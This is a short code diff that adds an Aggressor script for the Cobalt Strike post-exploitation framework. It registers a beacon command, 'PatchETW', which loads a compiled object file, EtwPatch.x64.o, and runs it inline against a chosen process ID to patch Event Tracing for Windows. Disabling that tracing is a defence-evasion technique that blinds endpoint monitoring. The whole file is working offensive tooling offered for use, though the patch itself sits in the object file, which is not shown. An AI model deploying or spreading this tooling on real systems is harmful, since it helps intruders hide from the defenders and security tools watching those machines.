@@ -1,0 +1,15 @@
+beacon_command_register (
+    "PatchETW",
+    "Opens a process (given PID), and patches Etw.");
+
+alias PatchETW {
+    $pid = $2;
+    local('$handle $data $args');
+    $handle = openf(script_resource("EtwPatch.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    $args = bof_pack($1, "i", $pid);
+    btask($1, "Opening $pid and Patching ETW!");
+    beacon_inline_execute($1, $data, "go", $args);
+}
